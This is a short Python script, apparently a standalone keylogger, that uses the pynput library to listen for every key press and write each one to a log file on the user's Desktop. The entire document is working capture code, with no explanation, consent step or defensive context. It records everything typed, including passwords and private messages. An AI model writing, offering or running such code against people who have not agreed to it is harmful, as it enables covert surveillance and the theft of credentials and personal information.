from pynput.keyboard import Key, Listener
import logging
import os

log_dir = ""

logging.basicConfig(filename=(log_dir + os.path.expanduser('~/Desktop/file.log')), \
                    level=logging.DEBUG, format='%(message)s')


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()